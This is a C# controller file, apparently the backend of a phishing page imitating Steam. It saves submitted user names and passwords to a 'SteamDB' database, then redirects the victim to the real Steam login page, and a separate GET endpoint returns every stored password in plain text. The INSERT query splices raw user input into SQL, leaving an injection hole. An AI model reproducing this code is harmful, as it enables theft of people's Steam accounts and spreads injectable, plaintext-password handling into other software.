using HttpServer.Attributes;
using HttpServer.Models;
using System.Net;
using System.Data.SqlClient;

namespace HttpServer.Controllers
{
    [ApiController]
    public class Accounts
    {
        [HttpGet]
        public List<Account> GetAccounts()
        {
            var accounts = new List<Account>();
            var connectionString = @"Data Source=(localdb)\MSSQLLocalDB;Initial Catalog=SteamDB;Integrated Security=True";
            string sqlExpression = "SELECT * FROM [dbo].[Accounts]";
            using (SqlConnection connection = new SqlConnection(connectionString))
            {
                connection.Open();
                SqlCommand command = new SqlCommand(sqlExpression, connection);
                SqlDataReader reader = command.ExecuteReader();

                if (reader.HasRows)
                {
                    while (reader.Read())
                    {
                        accounts.Add(
                            new Account {Id = reader.GetInt32(0), Name = reader.GetString(1), Password = reader.GetString(2) });
                    }
                }
                reader.Close();
            }
            return accounts;
        }

        [HttpGet]
        public Account GetAccountById(int id)
        {
            return GetAccounts().FirstOrDefault(a => a.Id == id);
        }

        [HttpPost]
        public void SaveAccount(string name, string password, HttpListenerResponse response)
        {
            var connectionString = @"Data Source=(localdb)\MSSQLLocalDB;Initial Catalog=SteamDB;Integrated Security=True";
            string sqlExpression = $"INSERT INTO [dbo].[Accounts](UserName, Password) VALUES('{name.Split('=')[1]}', '{password.Split('=')[1]}')";
            using (SqlConnection connection = new SqlConnection(connectionString))
            {
                connection.Open();
                SqlCommand command = new SqlCommand(sqlExpression, connection);
                command.ExecuteNonQuery();
            }
            response.Redirect("https://store.steampowered.com/login");
        }
    }
}
